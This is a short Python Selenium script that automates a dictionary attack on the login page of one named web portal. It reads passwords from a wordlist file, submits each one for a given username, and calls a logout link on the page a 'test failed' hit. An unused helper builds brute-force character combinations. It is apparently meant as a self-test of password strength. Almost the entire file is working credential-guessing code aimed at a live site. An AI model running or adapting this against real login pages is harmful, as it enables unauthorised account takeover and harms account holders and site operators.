from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import itertools
import os
import time

def every_combination(n):
    generator=itertools.combinations_with_replacement('abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\]^_`{|}~', n )
    return list(generator)
    
print("Please enter the username")
username_str=input()

while True:
    print("Please input the dictionary file name. eg:password.txt")
    n=input()
    try:
        f = open( r'./dictionary/{}'.format(n), 'r' )
        break
    except:
        print("File not found.")


options=webdriver.ChromeOptions()
options.binary_location="C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
chrome_driver=r"C:\Users\x1301\Desktop\chromedriver.exe"
driver=webdriver.Chrome(chrome_driver,chrome_options=options)

driver.get("https://ourportal.shohamc1.com/")
login_botton=driver.find_element_by_link_text("Login").click()
time.sleep(1)

username=driver.find_element_by_css_selector("[type='email']")
username.send_keys(username_str)

for line in f.readlines():
    line=line.replace('\n','')
    #print(line)
    password=driver.find_element_by_css_selector("[type='password']")
    password.clear()
    password.send_keys(line)
    driver.find_element_by_css_selector("button").click()
    try:
        assert "menu-log-out" in driver.page_source
        print("Test failed, find password {} for the given username".format(line))
        break
    except:
        continue
print("Test has passed, did not find password.")

f.close()
